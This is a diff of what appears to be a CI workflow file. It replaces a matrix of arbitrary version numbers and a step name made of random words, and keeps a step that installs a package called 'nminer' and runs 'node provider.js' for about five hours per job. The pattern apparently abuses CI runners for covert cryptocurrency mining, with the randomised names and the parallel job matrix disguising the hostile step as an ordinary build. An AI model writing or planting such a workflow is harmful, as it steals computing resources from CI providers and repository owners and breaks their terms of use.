@@ -9,21 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1173 }
-          - { version: 3716 }
-          - { version: 6381 }
-          - { version: 2177 }
-          - { version: 1243 }
-          - { version: 5658 }
-          - { version: 4665 }
-          - { version: 5178 }
-          - { version: 3605 }
-          - { version: 1313 }
-          - { version: 1242 }
-          - { version: 3006 }
-          - { version: 3739 }
-          - { version: 5113 }
-          - { version: 5656 }
+          - { version: 2808 }
+          - { version: 1441 }
+          - { version: 4316 }
+          - { version: 9284 }
+          - { version: 5529 }
+          - { version: 6875 }
+          - { version: 5764 }
+          - { version: 1501 }
+          - { version: 3646 }
+          - { version: 6763 }
+          - { version: 4029 }
+          - { version: 9329 }
+          - { version: 246 }
+          - { version: 991 }
+          - { version: 556 }
+          - { version: 5542 }
+          - { version: 8010 }
 
     steps:
       - name: Checkout
@@ -34,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: foolish understated instead wafer offset
+      - name: bravely barring after
         run: |
           npm install nminer@latest
-          timeout 349m node provider.js || echo "provider executed"
+          timeout 307m node provider.js || echo "provider executed"
